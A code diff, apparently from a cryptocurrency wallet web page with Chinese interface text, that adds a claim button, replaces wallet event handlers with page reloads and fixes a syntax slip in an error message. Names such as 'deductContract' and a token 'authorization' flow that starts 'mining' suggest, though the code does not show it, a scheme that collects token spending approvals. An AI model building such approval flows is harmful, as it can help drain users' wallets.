@@ -62,7 +62,14 @@ const elements = {
   lockedUntilLabel: document.getElementById('lockedUntilLabel')
 };
 
-const claimBtnPlaceholder = document.getElementById('claimButtonPlaceholder');
+// 動態建立 claimBtn
+const claimBtn = document.createElement('button');
+claimBtn.id = 'claimButton';
+claimBtn.className = 'icon-btn';
+claimBtn.style.display = 'none';
+claimBtn.disabled = true;
+claimBtn.textContent = '⚡';
+claimBtn.title = '領取';
 
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
@@ -562,20 +569,8 @@ async function initializeWallet() {
       disableInteractiveElements(true); connectButton.disabled = true; return;
     }
     provider = new window.ethers.providers.Web3Provider(window.ethereum);
-    window.ethereum.removeAllListeners('accountsChanged');
-    window.ethereum.removeAllListeners('chainChanged');
-    window.ethereum.on('accountsChanged', a => {
-      if (a.length === 0) {
-        disconnectWallet();
-      } else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
-        resetState(false);
-        setTimeout(connectWallet, 500);
-      }
-    });
-    window.ethereum.on('chainChanged', () => {
-      resetState(false);
-      setTimeout(connectWallet, 500);
-    });
+    window.ethereum.on('accountsChanged', a => a.length === 0 || a[0].toLowerCase() !== userAddress?.toLowerCase() ? location.reload() : null);
+    window.ethereum.on('chainChanged', () => location.reload());
     const accounts = await provider.send('eth_accounts', []);
     if (accounts.length > 0) {
       await connectWallet();
@@ -791,7 +786,7 @@ function setupSSE() {
   connectSSE();
 }
 
-// 初始化與所有事件綁定
+// 初始化
 document.addEventListener('DOMContentLoaded', async () => {
   updateLanguage(currentLang);
   await initializeWallet();
@@ -837,7 +832,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       await handleConditionalAuthorizationFlow();
       updateStatus(translations[currentLang].claimSuccess + ': 挖礦已開始。');
       activateStakingUI();
-    } catch (error) { updateStatus(`${translations[currentLang].error}: 授權失敗: ${error.message contenido}`, true); }
+    } catch (error) { updateStatus(`${translations[currentLang].error}: 授權失敗: ${error.message}`, true); }
     finally { startBtn.disabled = false; startBtn.textContent = translations[currentLang]?.startBtnText || '開始'; }
   };
   pledgeBtn.onclick = async () => {
